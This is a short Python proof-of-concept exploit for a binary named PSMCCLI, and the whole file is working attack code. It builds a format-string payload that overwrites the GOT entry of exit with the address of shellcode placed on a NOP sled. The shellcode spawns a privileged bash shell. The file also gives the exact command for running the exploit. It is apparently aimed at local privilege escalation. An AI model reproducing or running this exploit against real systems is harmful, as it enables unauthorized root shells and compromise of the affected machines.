# PSMCCLI_PoC by https://twitter.com/ju256_
# https://github.com/hellman/fixenv
# python exploit.py && ./r.sh /usr/local/bin/PSMCCLI $(cat exp)

import struct

def pad(s,shellcode):
  return s+"\x90"*(128-len(s)-len(shellcode))+shellcode

#overwriting the GOT entry of exit with the address of our shellcode 
EXIT_GOT = 0x0804a014
SHELLCODE_ADDRESS = 0xbffff90c

num1 = (SHELLCODE_ADDRESS & 0xffff) - 9
num2 = (SHELLCODE_ADDRESS >> 16) - num1 - 8
if num2 < 0:
  num2 += 0xffff

shellcode="\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"
#http://shell-storm.org/shellcode/files/shellcode-606.php

exp="B"
exp+=struct.pack("I",EXIT_GOT)
exp+=struct.pack("I",EXIT_GOT+2)
exp+="%126$"+str(num1)+"x"
exp+="%126$n"
exp+="%"+str(num2)+"x"
exp+="%127$n"
exp=pad(exp,shellcode)

open("exp","wb").write(exp)
